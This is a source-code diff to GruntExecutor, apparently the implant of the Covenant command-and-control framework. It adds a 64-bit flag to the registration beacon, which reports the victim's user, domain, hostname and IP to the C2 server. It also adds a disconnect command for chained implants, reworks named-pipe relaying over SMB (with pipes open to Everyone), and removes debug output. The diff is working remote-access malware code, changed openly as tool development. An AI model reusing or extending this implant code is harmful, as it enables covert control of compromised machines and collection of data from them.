@@ -86,7 +86,17 @@ namespace GruntExecutor
                 string UserDomainName = Environment.UserDomainName;
                 string UserName = Environment.UserName;
 
-                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
+                string RegisterBody = @"{ ""integrity"": " + Integrity 
+                    + @", ""process"": """ + Process 
+                    + @""", ""userDomainName"": """ + UserDomainName 
+                    + @""", ""userName"": """ + UserName 
+                    + @""", ""delay"": " + Convert.ToString(Delay) 
+                    + @", ""jitter"": " + Convert.ToString(Jitter) 
+                    + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) 
+                    + @", ""status"": 0, ""ipAddress"": """ + IPAddress 
+                    + @""", ""hostname"": """ + Hostname 
+                    + @""", ""x64"": """ + Environment.Is64BitProcess
+                    + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 var profile = new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse);
                 var messageCrafter = new MessageCrafter(GUID, SessionKey);
                 IMessenger baseMessenger = null;
@@ -367,6 +377,11 @@ namespace GruntExecutor
             {
                 return null;
             }
+            else if (read == GruntTaskingType.Disconnect.ToString())
+            {
+                this.UpstreamMessenger.Close();
+                return null;
+            }
             GruntEncryptedMessage gruntMessage = this.Profile.ParsePostResponse(read);
             if (gruntMessage == null)
             {
@@ -421,12 +436,12 @@ namespace GruntExecutor
             ClientSMBMessenger downstream = new ClientSMBMessenger(Hostname, PipeName);
             Thread readThread = new Thread(() =>
             {
-                while (true)
+                while (downstream.ActivePipe)
                 {
                     try
                     {
                         string read = downstream.Read();
-                        if (downstream.Identifier == "")
+                        if (read != null && String.IsNullOrEmpty(downstream.Identifier))
                         {
                             GruntEncryptedMessage message = this.Profile.ParsePostRequest(read);
                             if (message.GUID.Length == 20)
@@ -439,10 +454,7 @@ namespace GruntExecutor
                             }
                         }
                         this.UpstreamMessenger.Write(read);
-                    }
-                    catch (ThreadAbortException)
-                    {
-                        return;
+
                     }
                     catch (Exception e)
                     {
@@ -462,6 +474,8 @@ namespace GruntExecutor
             IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
             if (downstream != null)
             {
+                // Notify the child Grunt about the disconnect, else it will infinitely wait for reading the already closed pipe.
+                downstream.Write(GruntTaskingType.Disconnect.ToString());
                 downstream.Close();
                 this.DownstreamMessengers.Remove(downstream);
                 return true;
@@ -476,9 +490,8 @@ namespace GruntExecutor
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
 
-        protected object _WritePipeLock = new object();
-        protected object _ReadPipeLock = new object();
-        protected PipeStream Pipe { get; set; }
+        protected object _PipeLock = new object();
+        protected PipeStream _Pipe;
         protected string PipeName { get; } = null;
         public Thread ReadThread { get; set; } = null;
 
@@ -486,10 +499,7 @@ namespace GruntExecutor
         {
             this.Hostname = Hostname;
             this.PipeName = Pipename;
-            lock (this._WritePipeLock) lock (this._ReadPipeLock)
-                {
-                    this.CheckPipeState();
-                }
+            this.CheckPipeState();
         }
 
         public SMBMessengerBase(PipeStream Pipe, string Hostname, string Pipename)
@@ -497,41 +507,68 @@ namespace GruntExecutor
             this.Pipe = Pipe;
             this.Hostname = Hostname;
             this.PipeName = Pipename;
-            lock (this._WritePipeLock) lock (this._ReadPipeLock)
+            this.CheckPipeState();
+        }
+
+        public bool ActivePipe
+        {
+            get
+            {
+                lock (this._PipeLock)
                 {
-                    this.CheckPipeState();
+                    return this._Pipe != null && this._Pipe.IsConnected;
                 }
+            }
+        }
+
+        protected PipeStream Pipe
+        {
+            get
+            {
+                lock (this._PipeLock)
+                {
+                    return this._Pipe;
+                }
+            }
+            set
+            {
+                lock (this._PipeLock)
+                {
+                    this._Pipe = value;
+                }
+            }
         }
 
         protected abstract void CheckPipeState();
 
         public string Read()
         {
-            lock (this._ReadPipeLock)
-            {
-                this.CheckPipeState();
-                return Common.GruntEncoding.GetString(this.ReadBytes());
-            }
+            string result = null;
+            this.CheckPipeState();
+            if (this.ActivePipe)
+                result = Common.GruntEncoding.GetString(this.ReadBytes());
+            return result;
         }
 
         public void Write(string Message)
         {
-            lock (this._WritePipeLock)
-            {
-                this.CheckPipeState();
-                this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
-            }
+            this.CheckPipeState();
+            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
         }
 
         public void Close()
         {
-            lock (this._WritePipeLock) lock (this._ReadPipeLock)
+            lock (this._PipeLock)
             {
-                this.Pipe.Close();
-            }
-            if (ReadThread != null)
-            {
-                this.ReadThread.Abort();
+                try
+                {
+                    if (this._Pipe != null)
+                    {
+                        this._Pipe.Close();
+                    }
+                }
+                catch (Exception) { }
+                this._Pipe = null;
             }
         }
 
@@ -552,6 +589,7 @@ namespace GruntExecutor
                 writtenBytes += bytesToWrite;
             }
         }
+		
         private byte[] ReadBytes()
         {
             byte[] size = new byte[4];
@@ -589,17 +627,9 @@ namespace GruntExecutor
 
         protected override void CheckPipeState()
         {
-            if (this.Pipe == null || !this.Pipe.IsConnected)
+            if (!this.ActivePipe)
             {
-                try
-                {
-                    if (this.Pipe != null)
-                    {
-                        this.Pipe.Close();
-                        this.Pipe = null;
-                    }
-                }
-                catch (Exception e) { }
+
                 NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                 ClientPipe.Connect(Timeout);
                 ClientPipe.ReadMode = PipeTransmissionMode.Byte;
@@ -610,37 +640,28 @@ namespace GruntExecutor
 
     public class ServerSMBMessenger : SMBMessengerBase
     {
-        public ServerSMBMessenger(NamedPipeServerStream ServerPipe, string Pipename) : base(ServerPipe, "localhost:" + Pipename, Pipename)
-        {
-
-        }
+        public TaskingMessenger Messenger { get; set; } = null;
+        public ServerSMBMessenger(NamedPipeServerStream ServerPipe, string Pipename) : base(ServerPipe, "localhost:" + Pipename, Pipename) { }
 
         protected override void CheckPipeState()
         {
-            if (this.Pipe == null && !this.Pipe.IsConnected)
+            if (!this.ActivePipe)
             {
-                try
-                {
-                    if (this.Pipe != null)
-                    {
-                        this.Pipe.Close();
-                        this.Pipe = null;
-                    }
-                }
-                catch (Exception e) { }
+
                 PipeSecurity ps = new PipeSecurity();
                 ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
                 NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 newServerPipe.WaitForConnection();
                 this.Pipe = newServerPipe;
+                // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
+                this.Messenger.WriteTaskingMessage("");
             }
         }
     }
 
     public class HttpMessenger : IMessenger
     {
-        private Profile Profile { get; } = null;
-        private MessageCrafter MessageCrafter { get; } = null;
+
         public string Hostname { get; } = "";
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
@@ -669,8 +690,7 @@ namespace GruntExecutor
             , List<string> ProfileHttpHeaderValues
             , List<string> ProfileHttpUrls)
         {
-            this.Profile = Profile;
-            this.MessageCrafter = MessageCrafter;
+
             this.CovenantURI = CovenantURI;
             this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
             this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
@@ -702,7 +722,7 @@ namespace GruntExecutor
 
         public string Read()
         {
-            string result = null;
+
             if (ToReadValue != "")
             {
                 string temp = ToReadValue;
@@ -712,41 +732,20 @@ namespace GruntExecutor
             lock (this._WebClientLock)
             {
                 this.SetupCookieWebClient();
-                result = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
+                return this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
             }
-            return result;
+
         }
 
         public void Write(string Message)
         {
-            GruntEncryptedMessage gruntMessage = null;
-            Console.WriteLine("URL:     " + this.CovenantURI + this.GetURL());
-            if (!String.IsNullOrEmpty(Message))
-            {
-                gruntMessage = this.Profile.ParsePostRequest(Message);
-                if (gruntMessage != null)
-                {
-                    string json = this.MessageCrafter.Retrieve(gruntMessage);
-                    if (String.IsNullOrEmpty(json))
-                        Console.WriteLine("Payload Request*: " + Message);
-                    else
-                        Console.WriteLine("Payload Request: " + json);
-                }
-            }
+
             lock (this._WebClientLock)
             {
                 this.SetupCookieWebClient();
                 this.ToReadValue = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message);
             }
-            if (!String.IsNullOrEmpty(this.ToReadValue))
-            {
-                gruntMessage = this.Profile.ParsePostResponse(this.ToReadValue);
-                if (gruntMessage != null)
-                {
-                    string json = this.MessageCrafter.Retrieve(gruntMessage);
-                    Console.WriteLine("Payload Response: " + json);
-                }
-            }
+
         }
 
         public void Close() { }
